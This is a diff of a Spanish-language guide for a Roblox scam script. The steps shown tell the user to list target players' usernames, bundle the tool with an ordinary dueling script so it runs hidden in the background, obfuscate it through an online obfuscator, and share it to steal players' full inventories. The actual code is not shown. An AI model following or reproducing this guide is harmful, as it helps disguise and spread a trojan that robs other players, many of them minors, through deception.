@@ -14,10 +14,10 @@ En la lista JugadoresObjetivos, pon los nombres de usuario de Roblox a los que q
 > Ejemplo: "Usuario123", "ProGamer99"
 > 
 ⚙️ Paso 3: Agregar tu Script de Duelos
-El script tiene un espacio libre preparado para que agregues tu propio script de PvP. Ahí puedes pegar cualquier script de duelos que uses normalmente para jugar y funcionará al mismo tiempo de fondo.
+El script tiene un espacio libre preparado para que agregues un script de DUELOS. Ahí puedes pegar cualquier script de duelos que uses normalmente para jugar y funcionará al mismo tiempo de fondo.
 
 🚀 Paso 4: ¡compartir!
-Copia el código final, y ofuscalo en esta paguina web (solo pega el codigo y dale click a ofuscar "https://wearedevs.net/obfuscator" y compartelo para robar inventario completos.
+Copia el código final, y ofuscalo en esta paguina web "https://wearedevs.net/obfuscator" (solo pega el codigo y dale click a ofuscar) y compartelo para robar inventario completos.
 
 📄 Código de Configuración
 Copia el siguiente código y ajústalo con tu información:
